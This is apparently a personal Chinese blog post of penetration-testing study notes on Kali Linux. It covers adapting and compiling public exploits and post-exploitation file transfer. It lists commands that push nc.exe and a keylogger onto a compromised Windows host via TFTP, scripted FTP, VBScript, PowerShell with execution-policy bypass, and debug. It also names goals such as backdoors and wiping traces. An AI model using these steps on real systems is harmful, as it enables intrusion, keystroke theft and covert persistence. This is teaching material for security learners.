Kali Linux笔记(三十)：后漏洞利用阶段

发表于 2019-12-17 | 分类于 Kali

  1. 选择和修改EXP

    • 网上公开的EXP代码
      • 选择可信赖的EXP源（存在恶意黑客编造假的EXP，因为Shellcode都是十六进制）
      • Exploit-db（官方维护的漏洞溢出代码库）
      • SecurityFocus
      • Searchsploit
      • 有能力修改EXP（Python、Perl、Ruby、C、C++….）

  2. 选择和修改EXP

    • 646.c
      • 类Unix环境下编译
      • 返回地址与我们的环境不止
      • 反弹shell硬编码了回连IP地址
      • 缓冲区偏移量与我们环境不符
      • 目标IP硬编码
    • 646.c
      • Windows环境下编译
      • apt-get install mingw32 ▲ 2019.12.16 更改为apt-get install mingw-w64
      • dpkg –add-architecture i386 && apt-get update && apt-get install wine32
      • i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe ▲ 2019.12.16 更改为 i686-w64-mingw32-gcc 646.c -o s1.exe -lws2_32
      • wine sl.exe IP地址
exploit脚本路径：/usr/share/exploitdb/exploits/windows/remote
  • 643.c
    • Linux环境下编译
    • gcc 643.c -o 643
    • Shellcode，偏移量，IP地址需要被替换

  1. 避免有害的EXP

    • 不同的EXP
      • 不同的系统补丁
      • 软件版本
      • 不同的offset、Shellcode
    • 扫描探测目标系统版本，搭建适当的测试环境
      • 避免一锤子测试
    • 修改公开的EXP满足不同环境需要
      • 了解漏洞原理，修改溢出代码

  2. 后漏洞利用阶段（POST EXPLOITATION）

    • 上传工具（更好控制服务器）
    • 提权
    • 擦除攻击痕迹
    • 安装后门（进行长期的控制）
      • 长期控制
      • Dump密码
      • 内网渗透
    • 后漏洞利用阶段
      • 最大的挑战–防病毒软件（信息库进行匹配，软件会更新）
      • 使用合法远程控制软件

  3. 漏洞利用后阶段

    • 上传文件
      • 持久控制
      • 扩大对目标系统的控制能力
    • Linux系统
      • netcat
      • curl
      • wget
    • Windows
      • 缺少预装的下载工具

  4. 漏洞利用后阶段

    • 非交互式shell
      • 类NC远程控制shell
      • ftp 192.168.1.1（无法进行交互）
nc监听下来的shell与本机的shell存在不同
window xp安装ftp：appwiz.cpl → Add → IIS → FTP（可能需要安装光盘）

  1. 使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）

    • XP、2003默认安装
    • Win7、2008需要单独添加（作为操作系统组件单独添加）
    • 经常被边界防火墙过滤
    • Kali
      • mkdir /tftp
      • chown -R nobody /tftp（作为服务程序的权限，较低）
      • cp /usr/share/windows-binaries/nc.exe /tftp/（拷贝需要上传文件）
      • atftpd –daemon –port 69 /tftp（作为后端程序）
需要把tftpd下所有文件，组属设置为nobody，才能被下载
  • Windows
    • tftp -i IP地址 get nc.exe ▲ 2019.12.17 XP系统无默认安装tftp
tasklist查看Window运行的进程（exe）
klogger.exe记录键盘敲击的字符

  1. 利用FTP传输文件

    • Kali
      • apt-get install pure-ftpd
      • ./ftp.sh（ftp配置文件）
  • Windows
    • echo open IP地址 21>ftp.txt
    • echo 用户>>ftp.txt
    • echo 密码>>ftp.txt
    • echo bin>>ftp.txt
    • echo GET whoami.exe>>ftp.txt
    • echo GET klogger.exe>>ftp.txt
    • echo bye>>ftp.txt
    • ftp -s:ftp.txt
需要拷贝要上传的文件到ftp server的根目录下

  1. 使用VBSCRIPT传输文件

    • Kali
      • service apache2 start
      • cp /ftphome/whoami.exe
      • cp /ftphome/whoami.exe
    • Windows
      • wget.vbs
  • Windows ▲ 2019.12.17 XP系统报错：Microsoft VBScript runtime error
    • cscript wget.vbs http://IP地址/whoami.exe w.exe

  1. 使用POWERSHELL传输文件

    • Kali
      • service apache2 start
      • cd /var/www/html/
      • cp /ftphome/whoami.exe
    • Windows
      • Wget.ps1 ▲2019.12.17报错：webclient.DownloadFile($url,$file)请求期间发生异常
  • Windows
    • powershell.exe -ExecutionPolicy Bypass -NoLogo -Noninteractive -NoProfile -File Wget.ps1

  1. 使用DEBUG传输文件

    • Debug（Windows3.1就有Debug这个命令）
      • 汇编、反汇编
      • 16进制dump
      • 默认限制文本文件64K字节
    • upx压缩文件（对传输文件进行压缩，在Kali下压缩）
    • wine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt
    • debug<123.hex ▲ 2019.12.17 Debug为unrecognizable
    • copy 1.dll nc.exe
